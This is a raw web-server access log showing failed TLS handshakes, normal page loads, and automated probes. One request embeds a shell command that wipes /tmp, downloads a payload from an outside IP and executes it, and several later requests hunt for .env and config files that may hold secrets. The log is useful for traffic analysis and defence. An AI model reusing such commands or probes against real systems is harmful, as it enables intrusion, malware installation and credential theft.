172.21.0.1 - - [21/Sep/2022:20:01:31 +0000] "\x16\x03\x01\x01 \x01\x00\x01\x1C\x03\x03\xFF\xB6\xFB\xA2\x9E\x10hP{\xCD\xBA|$`\xCF\xC7\x17B\x08\xD0-\x1F\xAC\xC5\x16xw\x02|o\xC3\x14 F\xB0\x08F\xAE\xA9\x8A\xA2\xAA" 400 150 "-" "-"
172.21.0.1 - - [21/Sep/2022:20:01:32 +0000] "\x16\x03\x01\x00\xBD\x01\x00\x00\xB9\x03\x03\xB5ld/\xD2\xD9\xF5]\xBD\xED\xD2\x225\xA5\x9D\x9A\x04\xF9\xB7\xC2\xE1\xAC\xBE\xD3\xDB\xB5\x92\x88W\xF5\x15B\x00\x008\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 150 "-" "-"
172.21.0.1 - - [21/Sep/2022:20:01:33 +0000] "\x16\x03\x01\x00c\x01\x00\x00_\x03\x02\x1AER\xF5\x05UL\xD2\xEC\xD2\xE9,\xF0\xAC\xC3\xCF\xB14\x089Y\x07\x18\x8Dp\x9C\xE5\xC6\x1F\xFA9b\x00\x00\x12\xC0" 400 150 "-" "-"
172.21.0.1 - - [21/Sep/2022:20:01:34 +0000] "\x16\x03\x01\x00c\x01\x00\x00_\x03\x01\x03\x86\x97\x86`\xD1gH\xD4\xC7\xB7\xDD\xA2i\xC1\xFD\x0C\x98\x16\xDF\x1B\xA6\xC8wk\xB6\xBBk\xA0-3[\x00\x00\x12\xC0" 400 150 "-" "-"
172.21.0.1 - - [21/Sep/2022:20:01:52 +0000] "GET / HTTP/1.1" 200 17601 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
172.21.0.1 - - [21/Sep/2022:20:01:59 +0000] "GET /favicon.ico HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
172.21.0.1 - - [21/Sep/2022:21:22:23 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+81.161.229.46/jaws;sh+/tmp/jaws HTTP/1.1" 499 0 "-" "Hello, world"
192.168.128.1 - - [22/Sep/2022:06:11:38 +0000] "GET /utils.js HTTP/1.1" 502 150 "-" "Mozilla/5.0 (X11; CentOS; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0"
192.168.128.1 - - [22/Sep/2022:06:11:38 +0000] "GET /mail.js HTTP/1.1" 502 150 "-" "SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]"
192.168.128.1 - - [22/Sep/2022:06:11:38 +0000] "GET /.env HTTP/1.1" 502 150 "-" "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 Nokia5700/3.27; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413"
192.168.128.1 - - [22/Sep/2022:06:11:40 +0000] "GET /config.js HTTP/1.1" 502 552 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"
192.168.128.1 - - [22/Sep/2022:06:11:40 +0000] "GET /app.js HTTP/1.1" 502 150 "-" "Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaE7-00/010.016; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.3 3gpp-gba"
192.168.128.1 - - [22/Sep/2022:06:11:40 +0000] "GET /config/constants.js HTTP/1.1" 502 552 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47"
